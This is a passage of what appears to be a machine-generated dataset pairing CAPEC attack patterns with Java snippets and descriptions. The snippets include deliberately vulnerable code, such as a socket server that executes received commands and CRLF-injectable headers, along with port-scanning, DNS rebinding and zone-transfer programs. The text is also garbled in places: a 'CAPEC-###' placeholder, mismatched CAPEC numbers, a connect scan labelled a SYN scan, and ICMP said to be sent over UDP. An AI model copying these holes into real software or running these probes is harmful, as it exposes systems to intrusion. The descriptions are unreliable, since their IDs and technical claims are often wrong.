        "code_snippet": "import java.io.File;\nimport java.io.FileWriter;\nimport java.io.IOException;\nimport java.nio.file.Files;\nimport java.nio.file.Paths;\n\npublic class SchemaPoisoningExample {\n    public static void main(String[] args) {\n        String schemaPath = \"config/schema.xml\";\n        String maliciousSchema = \"<schema><element name='user' type='string'/><element name='password' type='string'/></schema>\";\n\n        // CWE-15: External Control of System or Configuration Setting\n        if (args.length > 0) {\n            schemaPath = args[0];\n        }\n\n        try {\n            // CWE-501: Trust Boundary Violation\n            String originalSchema = new String(Files.readAllBytes(Paths.get(schemaPath)));\n            System.out.println(\"Original Schema: \" + originalSchema);\n\n            // CWE-506: Embedded Malicious Code\n            FileWriter writer = new FileWriter(new File(schemaPath));\n            writer.write(maliciousSchema);\n            writer.close();\n\n            // CWE-497: Exposure of Sensitive System Information to an Unauthorized Control Sphere\n            System.out.println(\"Schema has been modified to: \" + maliciousSchema);\n        } catch (IOException e) {\n            e.printStackTrace();\n        }\n    }\n}",
        "description": "This Java code snippet demonstrates a schema poisoning attack. The code reads an XML schema from a file and allows an external user to specify the schema file path (CWE-15: External Control of System or Configuration Setting). It then reads the original schema (CWE-501: Trust Boundary Violation) and replaces it with a malicious schema (CWE-506: Embedded Malicious Code). Finally, it prints the modified schema, exposing sensitive system information (CWE-497: Exposure of Sensitive System Information to an Unauthorized Control Sphere). This example highlights how an adversary can corrupt or modify a schema to undermine the security of an application."
    },
    {
        "capec_id": "272",
        "capec_name": "Protocol Manipulation",
        "code_snippet": "import java.io.*;\nimport java.net.*;\n\npublic class VulnerableProtocol {\n    public static void main(String[] args) {\n        try {\n            Socket socket = new Socket(\"example.com\", 8080);\n            PrintWriter out = new PrintWriter(socket.getOutputStream(), true);\n            BufferedReader in = new BufferedReader(new InputStreamReader(socket.getInputStream()));\n\n            // Send a message to the server\n            out.println(\"AUTH user:password\");\n\n            // Read the server's response\n            String response = in.readLine();\n            System.out.println(\"Server response: \" + response);\n\n            // Close the connection\n            in.close();\n            out.close();\n            socket.close();\n        } catch (IOException e) {\n            e.printStackTrace();\n        }\n    }\n}",
        "description": "This Java code snippet demonstrates a vulnerable implementation of a communication protocol. The code establishes a socket connection to a server at 'example.com' on port 8080 and sends an authentication message ('AUTH user:password') without verifying the source of the communication channel (CWE-940). The server's response is read and printed without ensuring message integrity (CWE-924). Additionally, the code does not protect against capture-replay attacks (CWE-294) or reflection attacks (CWE-301). This example embodies the main idea of CAPEC-272 (Protocol Manipulation) by showing how improper handling of communication protocols can lead to various security vulnerabilities."
    },
    {
        "capec_id": "273",
        "capec_name": "HTTP Response Smuggling",
        "code_snippet": "import java.io.*;\nimport javax.servlet.*;\nimport javax.servlet.http.*;\n\npublic class HttpResponseSmugglingServlet extends HttpServlet {\n    protected void doGet(HttpServletRequest request, HttpServletResponse response) throws ServletException, IOException {\n        String userInput = request.getParameter(\"input\");\n        if (userInput != null) {\n            // CWE-113: Improper Neutralization of CRLF Sequences in HTTP Headers\n            String headerValue = \"UserInput: \" + userInput;\n            response.setHeader(\"X-User-Input\", headerValue);\n\n            // CWE-444: Inconsistent Interpretation of HTTP Requests\n            PrintWriter out = response.getWriter();\n            out.println(\"HTTP/1.1 200 OK\");\n            out.println(\"Content-Type: text/plain\");\n            out.println();\n            out.println(\"Hello, World!\");\n            out.println();\n            out.println(headerValue);\n        }\n    }\n}",
        "description": "This Java servlet code demonstrates a potential HTTP Response Smuggling vulnerability. The code takes user input from an HTTP request parameter and includes it in an HTTP response header without proper neutralization of CRLF sequences (CWE-113). This can allow an attacker to inject malicious HTTP headers or responses. Additionally, the code manually constructs an HTTP response, which can lead to inconsistent interpretation of HTTP requests (CWE-444) by different intermediaries or endpoints. This example highlights the risks associated with improper handling of user input and the construction of HTTP responses, which can be exploited for HTTP Response Smuggling attacks."
    },
    {
        "capec_id": "274",
        "capec_name": "HTTP Verb Tampering",
        "code_snippet": "import javax.servlet.http.HttpServlet;\nimport javax.servlet.http.HttpServletRequest;\nimport javax.servlet.http.HttpServletResponse;\nimport java.io.IOException;\n\npublic class VerbTamperingServlet extends HttpServlet {\n    @Override\n    protected void doGet(HttpServletRequest request, HttpServletResponse response) throws IOException {\n        // Process GET request\n        response.getWriter().write(\"GET request processed\");\n    }\n\n    @Override\n    protected void doPost(HttpServletRequest request, HttpServletResponse response) throws IOException {\n        // Process POST request\n        response.getWriter().write(\"POST request processed\");\n    }\n\n    @Override\n    protected void service(HttpServletRequest request, HttpServletResponse response) throws IOException {\n        String method = request.getMethod();\n        if (method.equals(\"GET\") || method.equals(\"POST\")) {\n            super.service(request, response);\n        } else {\n            // Improper handling of other HTTP verbs\n            response.getWriter().write(\"Unsupported HTTP method: \" + method);\n        }\n    }\n}",
        "description": "This Java servlet code demonstrates a vulnerability to HTTP Verb Tampering. The 'service' method checks if the HTTP method is either GET or POST and processes the request accordingly. However, it does not properly handle other HTTP verbs, allowing an attacker to potentially bypass access restrictions by using unsupported HTTP methods. This code snippet embodies the main idea of CAPEC-274 (HTTP Verb Tampering) and highlights related weaknesses such as CWE-302 (Authentication Bypass by Assumed-Immutable Data) and CWE-654 (Reliance on a Single Factor in a Security Decision). The code assumes that only GET and POST methods are valid, but an attacker could use other methods to bypass these checks."
    },
    {
        "capec_id": "275",
        "capec_name": "DNS Rebinding",
        "code_snippet": "import java.net.*;\nimport java.io.*;\n\npublic class DNSRebindingExample {\n    public static void main(String[] args) throws Exception {\n        String maliciousDomain = \"malicious.example.com\";\n        String internalIP = \"192.168.1.100\";\n\n        // Initial DNS resolution\n        InetAddress initialAddress = InetAddress.getByName(maliciousDomain);\n        System.out.println(\"Initial IP: \" + initialAddress.getHostAddress());\n\n        // Simulate DNS rebinding by changing the IP address\n        // In a real attack, this would be done by the attacker's DNS server\n        Thread.sleep(5000); // Wait for DNS cache to expire\n        System.setProperty(\"sun.net.spi.nameservice.provider.1\", \"dns,sun\");\n        System.setProperty(\"sun.net.spi.nameservice.nameservers\", internalIP);\n\n        // DNS resolution after rebinding\n        InetAddress reboundAddress = InetAddress.getByName(maliciousDomain);\n        System.out.println(\"Rebound IP: \" + reboundAddress.getHostAddress());\n\n        // Attempt to connect to the internal IP\n        Socket socket = new Socket(reboundAddress, 80);\n        PrintWriter out = new PrintWriter(socket.getOutputStream(), true);\n        BufferedReader in = new BufferedReader(new InputStreamReader(socket.getInputStream()));\n\n        // Send HTTP request to internal IP\n        out.println(\"GET / HTTP/1.1\");\n        out.println(\"Host: \" + maliciousDomain);\n        out.println(\"Connection: close\");\n        out.println();\n\n        // Read response\n        String responseLine;\n        while ((responseLine = in.readLine()) != null) {\n            System.out.println(responseLine);\n        }\n\n        // Close resources\n        in.close();\n        out.close();\n        socket.close();\n    }\n}",
        "description": "This Java code snippet demonstrates a DNS rebinding attack. Initially, the code resolves the IP address of a malicious domain controlled by an attacker. After a simulated delay (representing the DNS cache expiration), the attacker changes the DNS resolution to an internal IP address within the target organization. The code then attempts to connect to this internal IP address, effectively allowing the attacker to access internal resources through the victim's browser. This example highlights the vulnerability of relying on DNS for security-critical actions (CWE-350) and the potential risks of binding to unrestricted IP addresses (CWE-1327)."
    },
    {
        "capec_id": "276",
        "capec_name": "Inter-component Protocol Manipulation",
        "code_snippet": "import java.io.*;\nimport java.net.*;\n\npublic class VulnerableProtocol {\n    public static void main(String[] args) {\n        try {\n            ServerSocket serverSocket = new ServerSocket(8080);\n            Socket clientSocket = serverSocket.accept();\n            BufferedReader in = new BufferedReader(new InputStreamReader(clientSocket.getInputStream()));\n            PrintWriter out = new PrintWriter(clientSocket.getOutputStream(), true);\n\n            String receivedMessage = in.readLine();\n            // CWE-319: Cleartext Transmission of Sensitive Information\n            System.out.println(\"Received: \" + receivedMessage);\n\n            // CWE-924: Improper Enforcement of Message Integrity During Transmission\n            if (receivedMessage.equals(\"AUTHENTICATE\")) {\n                out.println(\"AUTH_SUCCESS\");\n            } else {\n                out.println(\"AUTH_FAIL\");\n            }\n\n            // CWE-707: Improper Neutralization\n            String command = in.readLine();\n            Runtime.getRuntime().exec(command); // Potentially dangerous command execution\n\n            clientSocket.close();\n            serverSocket.close();\n        } catch (IOException e) {\n            e.printStackTrace();\n        }\n    }\n}",
        "description": "This Java code snippet demonstrates a vulnerable inter-component protocol communication scenario. The server listens on port 8080 and accepts incoming connections. It reads a message from the client in cleartext (CWE-319), which can be intercepted by an attacker. The server then checks the message for authentication but does not ensure the integrity of the message (CWE-924), allowing potential tampering. Additionally, the server reads another command from the client and executes it without proper neutralization (CWE-707), leading to potential command injection. This code embodies the main idea of CAPEC-272 by showcasing how improper handling of inter-component protocols can lead to various security vulnerabilities."
    },
    {
        "capec_id": "277",
        "capec_name": "Data Interchange Protocol Manipulation",
        "code_snippet": "import java.io.StringReader;\nimport javax.xml.parsers.DocumentBuilder;\nimport javax.xml.parsers.DocumentBuilderFactory;\nimport org.w3c.dom.Document;\nimport org.xml.sax.InputSource;\n\npublic class VulnerableXMLParser {\n    public static void main(String[] args) {\n        String xmlData = \"<user><id>123</id><role>admin</role></user>\";\n        parseXML(xmlData);\n    }\n\n    public static void parseXML(String xmlData) {\n        try {\n            DocumentBuilderFactory factory = DocumentBuilderFactory.newInstance();\n            DocumentBuilder builder = factory.newDocumentBuilder();\n            Document document = builder.parse(new InputSource(new StringReader(xmlData)));\n\n            String userId = document.getElementsByTagName(\"id\").item(0).getTextContent();\n            String userRole = document.getElementsByTagName(\"role\").item(0).getTextContent();\n\n            // CWE-302: Authentication Bypass by Assumed-Immutable Data\n            if (userRole.equals(\"admin\")) {\n                System.out.println(\"User \" + userId + \" is an admin.\");\n            } else {\n                System.out.println(\"User \" + userId + \" is not an admin.\");\n            }\n        } catch (Exception e) {\n            e.printStackTrace();\n        }\n    }\n}",
        "description": "This Java code snippet demonstrates a vulnerable XML parser that embodies the main idea of CAPEC-272: Data Interchange Protocol Manipulation. The code reads and parses an XML string containing user information, including an ID and a role. The vulnerability lies in the assumption that the 'role' field is immutable and trustworthy (CWE-302: Authentication Bypass by Assumed-Immutable Data). An attacker could manipulate the XML data to escalate privileges by changing the 'role' to 'admin'. The code does not validate or sanitize the input, making it susceptible to various attacks, including impersonation and unauthorized access."
    },
    {
        "capec_id": "278",
        "capec_name": "Web Services Protocol Manipulation",
        "code_snippet": "import javax.xml.soap.*;\nimport java.io.ByteArrayInputStream;\n\npublic class WebServiceProtocolManipulation {\n    public static void main(String[] args) throws Exception {\n        String maliciousSOAPMessage = \"<soapenv:Envelope xmlns:soapenv=\\\"http://schemas.xmlsoap.org/soap/envelope/\\\" xmlns:web=\\\"http://webservice.example.com/\\\"><soapenv:Header/><soapenv:Body><web:restrictedFunction><web:param>maliciousValue</web:param></web:restrictedFunction></soapenv:Body></soapenv:Envelope>\";\n\n        // Simulate sending the malicious SOAP message to the web service\n        SOAPMessage soapMessage = MessageFactory.newInstance().createMessage(null, new ByteArrayInputStream(maliciousSOAPMessage.getBytes()));\n        SOAPConnectionFactory soapConnectionFactory = SOAPConnectionFactory.newInstance();\n        SOAPConnection soapConnection = soapConnectionFactory.createConnection();\n\n        // Assuming the endpoint is vulnerable and processes the malicious message\n        String endpoint = \"http://vulnerable-webservice.example.com/service\";\n        SOAPMessage response = soapConnection.call(soapMessage, endpoint);\n\n        // Print the response for demonstration purposes\n        response.writeTo(System.out);\n\n        soapConnection.close();\n    }\n}",
        "description": "This Java code snippet demonstrates a Web Services Protocol Manipulation attack. The code constructs a malicious SOAP message that calls a restricted function with unexpected parameters. The SOAP message is then sent to a vulnerable web service endpoint. This example embodies the main idea of CAPEC-### by manipulating the web service protocol to access restricted functions or data. The code also touches on related CWEs, such as CWE-707 (Improper Neutralization) by not validating the SOAP message, CWE-602 (Client-Side Enforcement of Server-Side Security) by assuming the client can call restricted functions, and CWE-573 (Improper Following of Specification by Caller) by not adhering to the expected use of the web service."
    },
    {
        "capec_id": "279",
        "capec_name": "SOAP Manipulation",
        "code_snippet": "import javax.xml.soap.*;\nimport java.io.ByteArrayInputStream;\n\npublic class SOAPManipulationExample {\n    public static void main(String[] args) throws Exception {\n        String soapMessage = \"<soapenv:Envelope xmlns:soapenv=\\\"http://schemas.xmlsoap.org/soap/envelope/\\\" xmlns:web=\\\"http://example.com/webservices\\\">\"\n                + \"<soapenv:Header/>\"\n                + \"<soapenv:Body>\"\n                + \"<web:Login>\"\n                + \"<username>admin</username>\"\n                + \"<password>password</password>\"\n                + \"</web:Login>\"\n                + \"</soapenv:Body>\"\n                + \"</soapenv:Envelope>\";\n\n        // Simulate SOAP message manipulation\n        soapMessage = soapMessage.replace(\"<username>admin</username>\", \"<username>attacker</username>\");\n\n        // Parse the manipulated SOAP message\n        MessageFactory messageFactory = MessageFactory.newInstance();\n        SOAPMessage message = messageFactory.createMessage(null, new ByteArrayInputStream(soapMessage.getBytes()));\n\n        // Process the SOAP message (vulnerable to manipulation)\n        SOAPBody body = message.getSOAPBody();\n        SOAPElement loginElement = (SOAPElement) body.getChildElements().next();\n        String username = loginElement.getElementsByTagName(\"username\").item(0).getTextContent();\n        String password = loginElement.getElementsByTagName(\"password\").item(0).getTextContent();\n\n        // Print the extracted credentials\n        System.out.println(\"Username: \" + username);\n        System.out.println(\"Password: \" + password);\n    }\n}",
        "description": "This Java code snippet demonstrates a SOAP message manipulation vulnerability. The code constructs a SOAP message containing login credentials, then simulates an attack by modifying the username within the SOAP message. The manipulated message is parsed and processed without any validation, allowing the attacker to inject arbitrary values. This example highlights the risks associated with improper neutralization (CWE-707) and client-side enforcement of server-side security (CWE-602). The code also implicitly touches on the potential for XML External Entity (XXE) attacks (CWE-611) and authentication bypass (CWE-294, CWE-603) due to the lack of proper validation and security checks."
    },
    {
        "capec_id": "280",
        "capec_name": "DEPRECATED: SOAP Parameter Tampering",
        "code_snippet": "import javax.xml.soap.*;\nimport java.io.ByteArrayInputStream;\nimport java.nio.charset.StandardCharsets;\n\npublic class SOAPParameterTampering {\n    public static void main(String[] args) throws Exception {\n        String maliciousSOAPMessage = \"<soapenv:Envelope xmlns:soapenv=\\\"http://schemas.xmlsoap.org/soap/envelope/\\\" xmlns:web=\\\"http://example.com/webservices\\\">\"\n                + \"<soapenv:Header/>\"\n                + \"<soapenv:Body>\"\n                + \"<web:Login>\"\n                + \"<web:username>admin</web:username>\"\n                + \"<web:password>password</web:password>\"\n                + \"</web:Login>\"\n                + \"</soapenv:Body>\"\n                + \"</soapenv:Envelope>\";\n\n        SOAPMessage message = MessageFactory.newInstance().createMessage(null,\n                new ByteArrayInputStream(maliciousSOAPMessage.getBytes(StandardCharsets.UTF_8)));\n\n        // Process the SOAP message (this is where the vulnerability lies)\n        SOAPBody body = message.getSOAPBody();\n        SOAPElement loginElement = (SOAPElement) body.getChildElements().next();\n        String username = loginElement.getElementsByTagName(\"username\").item(0).getTextContent();\n        String password = loginElement.getElementsByTagName(\"password\").item(0).getTextContent();\n\n        // Simulate authentication bypass\n        if (\"admin\".equals(username) && \"password\".equals(password)) {\n            System.out.println(\"Authentication successful!\");\n        } else {\n            System.out.println(\"Authentication failed!\");\n        }\n    }\n}",
        "description": "This Java code snippet demonstrates a SOAP parameter tampering vulnerability. The code constructs a malicious SOAP message that contains hardcoded credentials (username and password). The SOAP message is then parsed, and the credentials are extracted and used for authentication. This example highlights the risk of SOAP parameter tampering, where an attacker can manipulate the SOAP message to bypass authentication mechanisms. The code also touches on related CWEs, such as CWE-294 (Authentication Bypass by Capture-replay), by showing how an attacker could potentially replay a captured SOAP message to gain unauthorized access."
    },
    {
        "capec_id": "285",
        "capec_name": "ICMP Echo Request Ping",
        "code_snippet": "import java.io.IOException;\nimport java.net.InetAddress;\nimport java.net.UnknownHostException;\n\npublic class PingTest {\n    public static void main(String[] args) {\n        if (args.length != 1) {\n            System.out.println(\"Usage: java PingTest <IP address>\");\n            return;\n        }\n\n        String ipAddress = args[0];\n        try {\n            InetAddress inet = InetAddress.getByName(ipAddress);\n            if (inet.isReachable(5000)) { // 5 seconds timeout\n                System.out.println(\"Host is reachable\");\n            } else {\n                System.out.println(\"Host is not reachable\");\n            }\n        } catch (UnknownHostException e) {\n            System.out.println(\"Unknown host: \" + ipAddress);\n        } catch (IOException e) {\n            System.out.println(\"Network error: \" + e.getMessage());\n        }\n    }\n}",
        "description": "This Java code snippet demonstrates a simple implementation of an ICMP Echo Request (Ping) to check if a target host is reachable. The program takes an IP address as a command-line argument and attempts to ping the specified address. If the host is reachable within a 5-second timeout, it prints 'Host is reachable'; otherwise, it prints 'Host is not reachable'. This code embodies the main idea of the CAPEC by sending an ICMP Echo Request to determine if a target system is responsive. The related CWEs provide additional context on potential vulnerabilities, such as exposure of sensitive information (CWE-200) if the ping response reveals the host's presence, and cleartext transmission (CWE-319) since ICMP packets are not encrypted."
    },
    {
        "capec_id": "287",
        "capec_name": "TCP SYN Scan",
        "code_snippet": "import java.io.IOException;\nimport java.net.InetAddress;\nimport java.net.Socket;\nimport java.net.UnknownHostException;\n\npublic class TCPSynScan {\n    public static void main(String[] args) {\n        String target = \"192.168.1.1\"; // Target IP address\n        int startPort = 1;\n        int endPort = 1024;\n\n        for (int port = startPort; port <= endPort; port++) {\n            try {\n                Socket socket = new Socket(target, port);\n                System.out.println(\"Port \" + port + \" is open.\");\n                socket.close();\n            } catch (UnknownHostException e) {\n                System.err.println(\"Unknown host: \" + target);\n                break;\n            } catch (IOException e) {\n                // Port is closed or filtered\n            }\n        }\n    }\n}",
        "description": "This Java code snippet performs a basic TCP SYN scan on a target IP address (192.168.1.1) over a range of ports (1 to 1024). The code attempts to establish a socket connection to each port in the specified range. If the connection is successful, it prints that the port is open. If an IOException occurs, it implies that the port is closed or filtered. This code embodies the main idea of the CAPEC 'TCP SYN Scan' by demonstrating how an adversary might scan for open ports on a target system. The related CWEs provide context for potential vulnerabilities, such as exposing sensitive information (CWE-200) or having an excessive attack surface (CWE-1125), which can be exploited through such scanning techniques."
    },
    {
        "capec_id": "288",
        "capec_name": "DEPRECATED: ICMP Echo Request Ping",
        "code_snippet": "import java.io.*;\nimport java.net.*;\n\npublic class PingReplayAttack {\n    public static void main(String[] args) throws IOException {\n        String targetHost = \"192.168.1.1\";\n        int targetPort = 80;\n        byte[] pingMessage = new byte[64]; // ICMP Echo Request message\n\n        // Simulate capturing a ping message\n        capturePingMessage(pingMessage);\n\n        // Replay the captured ping message\n        replayPingMessage(targetHost, targetPort, pingMessage);\n    }\n\n    private static void capturePingMessage(byte[] pingMessage) {\n        // Simulate capturing a ping message (in reality, this would be done via packet sniffing)\n        for (int i = 0; i < pingMessage.length; i++) {\n            pingMessage[i] = (byte) i;\n        }\n    }\n\n    private static void replayPingMessage(String host, int port, byte[] message) throws IOException {\n        Socket socket = new Socket(host, port);\n        OutputStream out = socket.getOutputStream();\n        out.write(message);\n        out.flush();\n        socket.close();\n    }\n}",
        "description": "This Java code snippet demonstrates a simplified version of a capture-replay attack using ICMP Echo Request (ping) messages. The code captures a ping message and then replays it to a target host and port. This embodies the main idea of the deprecated CAPEC-285, which involves using ICMP Echo Requests for malicious purposes. The related CWE-294 (Authentication Bypass by Capture-replay) is represented by the replaying of the captured message, which could potentially bypass security mechanisms if the system relies on such messages for authentication or other critical functions."
    },
    {
        "capec_id": "289",
        "capec_name": "DEPRECATED: Infrastructure-based footprinting",
        "code_snippet": "import java.util.HashMap;\nimport java.util.Map;\n\npublic class VulnerableCode {\n    private static Map<String, String> protectedData = new HashMap<>();\n    private static Map<String, String> unprotectedData = new HashMap<>();\n\n    static {\n        // Simulate overlapping protected and unprotected regions\n        protectedData.put(\"secretKey\", \"superSecretValue\");\n        unprotectedData.put(\"publicKey\", \"publicValue\");\n    }\n\n    public static void main(String[] args) {\n        // Simulate access to unprotected data\n        String data = getData(\"publicKey\");\n        System.out.println(\"Accessed Data: \" + data);\n    }\n\n    public static String getData(String key) {\n        // Overlapping access control issue\n        if (unprotectedData.containsKey(key)) {\n            return unprotectedData.get(key);\n        } else if (protectedData.containsKey(key)) {\n            return protectedData.get(key);\n        }\n        return null;\n    }\n}",
        "description": "This Java code snippet demonstrates a vulnerability where protected and unprotected data regions overlap, allowing potential unauthorized access to protected data. The `protectedData` map is intended to store sensitive information, while the `unprotectedData` map stores non-sensitive information. The `getData` method checks both maps for the requested key, leading to a situation where an attacker could potentially access protected data by exploiting the overlap. This embodies the idea of CAPEC-169 and CWE-1316, where improper management of address maps allows bypassing access controls."
    },
    {
        "capec_id": "290",
        "capec_name": "Enumerate Mail Exchange (MX) Records",
        "code_snippet": "import java.net.InetAddress;\nimport java.net.UnknownHostException;\nimport javax.naming.directory.DirContext;\nimport javax.naming.directory.InitialDirContext;\nimport javax.naming.directory.Attributes;\nimport java.util.Hashtable;\n\npublic class MXRecordEnumeration {\n    public static void main(String[] args) {\n        String domain = \"example.com\";\n        try {\n            Hashtable<String, String> env = new Hashtable<>();\n            env.put(\"java.naming.factory.initial\", \"com.sun.jndi.dns.DnsContextFactory\");\n            DirContext ictx = new InitialDirContext(env);\n            Attributes attrs = ictx.getAttributes(domain, new String[]{\"MX\"});\n            System.out.println(\"MX Records for domain: \" + domain);\n            attrs.getAll().asIterator().forEachRemaining(attr -> {\n                System.out.println(attr);\n                try {\n                    String mxRecord = attr.toString().split(\" \")[1];\n                    InetAddress address = InetAddress.getByName(mxRecord);\n                    System.out.println(\"Resolved IP: \" + address.getHostAddress());\n                } catch (UnknownHostException e) {\n                    System.err.println(\"Failed to resolve MX record: \" + e.getMessage());\n                }\n            });\n        } catch (Exception e) {\n            System.err.println(\"Failed to enumerate MX records: \" + e.getMessage());\n        }\n    }\n}",
        "description": "This Java code snippet demonstrates how to enumerate MX (Mail Exchange) records for a given domain using DNS queries. The code uses Java's JNDI (Java Naming and Directory Interface) to perform the DNS query and retrieve the MX records. For each MX record, it attempts to resolve the corresponding IP address. This process can potentially expose sensitive information, such as the IP addresses of internal mail servers or firewalls, which aligns with the CAPEC description. The code also highlights several related CWEs: it exposes sensitive information (CWE-200), relies on DNS resolution for security decisions (CWE-350), and may incorrectly specify destinations in communication channels (CWE-941)."
    },
    {
        "capec_id": "291",
        "capec_name": "DNS Zone Transfers",
        "code_snippet": "import java.net.*;\nimport java.io.*;\n\npublic class DNSZoneTransfer {\n    public static void main(String[] args) {\n        String dnsServer = \"example.com\";\n        try {\n            // Perform a DNS zone transfer\n            Socket socket = new Socket(dnsServer, 53);\n            PrintWriter out = new PrintWriter(socket.getOutputStream(), true);\n            BufferedReader in = new BufferedReader(new InputStreamReader(socket.getInputStream()));\n\n            // Send a request for a zone transfer\n            out.println(\"AXFR\");\n\n            // Read the response\n            String response;\n            while ((response = in.readLine()) != null) {\n                System.out.println(response);\n            }\n\n            // Close the connections\n            in.close();\n            out.close();\n            socket.close();\n        } catch (IOException e) {\n            e.printStackTrace();\n        }\n    }\n}",
        "description": "This Java code snippet demonstrates a DNS zone transfer request to a DNS server. The code attempts to connect to a DNS server on port 53 and sends an 'AXFR' request, which is used for zone transfers. If the DNS server is misconfigured to allow zone transfers, it will respond with a list of DNS records, potentially exposing sensitive information about the network topology, including IP addresses and hostnames. This example embodies the main idea of CAPEC-137 (DNS Zone Transfers) and highlights CWE-200 (Exposure of Sensitive Information to an Unauthorized Actor) by showing how an attacker could exploit a misconfigured DNS server to gain unauthorized access to sensitive information."
    },
    {
        "capec_id": "292",
        "capec_name": "Host Discovery",
        "code_snippet": "import java.io.IOException;\nimport java.net.InetAddress;\nimport java.net.UnknownHostException;\n\npublic class HostDiscovery {\n    public static void main(String[] args) {\n        String[] ipAddresses = {\"192.168.1.1\", \"192.168.1.2\", \"192.168.1.3\"};\n        for (String ip : ipAddresses) {\n            try {\n                InetAddress inet = InetAddress.getByName(ip);\n                if (inet.isReachable(1000)) { // CWE-291: Reliance on IP Address for Authentication\n                    System.out.println(\"Host \" + ip + \" is reachable.\");\n                } else {\n                    System.out.println(\"Host \" + ip + \" is not reachable.\");\n                }\n            } catch (UnknownHostException e) {\n                System.out.println(\"Unknown host: \" + ip);\n            } catch (IOException e) {\n                System.out.println(\"Error checking host: \" + ip);\n            }\n        }\n    }\n}",
        "description": "This Java code snippet performs a basic host discovery by pinging a range of IP addresses to determine if they are reachable. The code iterates over a list of IP addresses and uses the `InetAddress` class to check if each IP address is reachable within a 1000ms timeout. If the host is reachable, it prints a message indicating so; otherwise, it prints that the host is not reachable. This embodies the main idea of CAPEC-309 (Host Discovery) by attempting to identify live hosts on a network. The code also demonstrates CWE-291 (Reliance on IP Address for Authentication) as it relies on the IP address to determine the presence of a host, which can be a security risk if used for authentication purposes."
    },
    {
        "capec_id": "293",
        "capec_name": "Traceroute Route Enumeration",
        "code_snippet": "import java.io.IOException;\nimport java.net.InetAddress;\nimport java.net.UnknownHostException;\n\npublic class Traceroute {\n    public static void main(String[] args) throws IOException {\n        if (args.length != 1) {\n            System.out.println(\"Usage: java Traceroute <hostname>\");\n            return;\n        }\n\n        String target = args[0];\n        int maxHops = 30;\n        int timeout = 5000;\n\n        for (int ttl = 1; ttl <= maxHops; ttl++) {\n            try {\n                Process trace = Runtime.getRuntime().exec(\"ping -c 1 -t \" + ttl + \" \" + target);\n                trace.waitFor();\n                InetAddress address = InetAddress.getByName(target);\n                if (trace.exitValue() == 0) {\n                    System.out.println(\"Reached target: \" + address.getHostAddress());\n                    break;\n                } else {\n                    System.out.println(\"Hop \" + ttl + \": \" + address.getHostAddress());\n                }\n            } catch (UnknownHostException e) {\n                System.out.println(\"Unknown host: \" + target);\n                break;\n            } catch (InterruptedException e) {\n                System.out.println(\"Traceroute interrupted\");\n                break;\n            }\n        }\n    }\n}",
        "description": "This Java code snippet performs a basic traceroute operation to map out the route data takes to reach a target destination. It uses the 'ping' command with increasing TTL (Time-to-Live) values to identify each hop along the route. The code demonstrates the concept of 'Traceroute Route Enumeration' (CAPEC-200) by incrementally sending packets to the target and printing out each hop's address. The code also embodies several related CWEs: \n- CWE-200: The code exposes sensitive information (network topology) to unauthorized actors by printing out each hop's address.\n- CWE-319: The communication (ping command) is done in cleartext, which can be sniffed by unauthorized actors.\n- CWE-497: The code does not prevent sensitive system-level information (network route) from being accessed by unauthorized actors.\n- CWE-941: The code assumes the target is correctly specified by the user, but does not validate it, potentially leading to incorrect destinations."
    },
    {
        "capec_id": "294",
        "capec_name": "ICMP Address Mask Request",
        "code_snippet": "import java.net.*;\nimport java.io.*;\n\npublic class ICMPAddressMaskRequest {\n    public static void main(String[] args) throws IOException {\n        InetAddress target = InetAddress.getByName(\"192.168.1.1\");\n        byte[] icmpRequest = new byte[8];\n        icmpRequest[0] = 17; // ICMP Type 17 (Address Mask Request)\n        icmpRequest[1] = 0;  // Code\n        icmpRequest[2] = 0;  // Checksum (to be calculated)\n        icmpRequest[3] = 0;  // Checksum (to be calculated)\n        icmpRequest[4] = 0;  // Identifier\n        icmpRequest[5] = 0;  // Identifier\n        icmpRequest[6] = 0;  // Sequence Number\n        icmpRequest[7] = 0;  // Sequence Number\n\n        DatagramSocket socket = new DatagramSocket();\n        DatagramPacket packet = new DatagramPacket(icmpRequest, icmpRequest.length, target, 0);\n        socket.send(packet);\n\n        byte[] buffer = new byte[1024];\n        DatagramPacket response = new DatagramPacket(buffer, buffer.length);\n        socket.receive(response);\n\n        // Process the response to extract sensitive information\n        System.out.println(\"Received ICMP Address Mask Reply from: \" + response.getAddress());\n        socket.close();\n    }\n}",
        "description": "This Java code snippet demonstrates how an adversary might send an ICMP Address Mask Request (ICMP Type 17) to a target IP address to gather sensitive networking information. The code constructs an ICMP request packet and sends it to the target. Upon receiving the ICMP Address Mask Reply (ICMP Type 18), the code processes the response to extract sensitive information such as subnet masks, default gateways, and broadcast addresses. This information can be used to plan further attacks, such as router-based attacks or denial-of-service attacks. The code also highlights vulnerabilities related to the exposure of sensitive information (CWE-200), reliance on IP address for authentication (CWE-291), and improper restriction of communication channels (CWE-923)."
    },
    {
        "capec_id": "295",
        "capec_name": "Timestamp Request",
        "code_snippet": "import java.io.IOException;\nimport java.io.PrintWriter;\nimport java.text.SimpleDateFormat;\nimport java.util.Date;\nimport javax.servlet.ServletException;\nimport javax.servlet.annotation.WebServlet;\nimport javax.servlet.http.HttpServlet;\nimport javax.servlet.http.HttpServletRequest;\nimport javax.servlet.http.HttpServletResponse;\n\n@WebServlet(\"/timestamp\")\npublic class TimestampServlet extends HttpServlet {\n    protected void doGet(HttpServletRequest request, HttpServletResponse response) throws ServletException, IOException {\n        // CWE-598: Use of GET Request Method With Sensitive Query Strings\n        String sensitiveData = request.getParameter(\"sensitiveData\");\n        \n        // CWE-200: Exposure of Sensitive Information to an Unauthorized Actor\n        if (sensitiveData != null) {\n            response.getWriter().println(\"Sensitive Data: \" + sensitiveData);\n        }\n        \n        // CWE-208: Observable Timing Discrepancy\n        long startTime = System.currentTimeMillis();\n        // Simulate some processing time\n        try {\n            Thread.sleep(1000); // 1 second delay\n        } catch (InterruptedException e) {\n            e.printStackTrace();\n        }\n        long endTime = System.currentTimeMillis();\n        long processingTime = endTime - startTime;\n        \n        // CWE-385: Covert Timing Channel\n        response.getWriter().println(\"Processing Time: \" + processingTime + \"ms\");\n        \n        // Return the current timestamp\n        String timestamp = new SimpleDateFormat(\"yyyy-MM-dd HH:mm:ss\").format(new Date());\n        response.setContentType(\"text/plain\");\n        PrintWriter out = response.getWriter();\n        out.println(\"Current Timestamp: \" + timestamp);\n    }\n}",
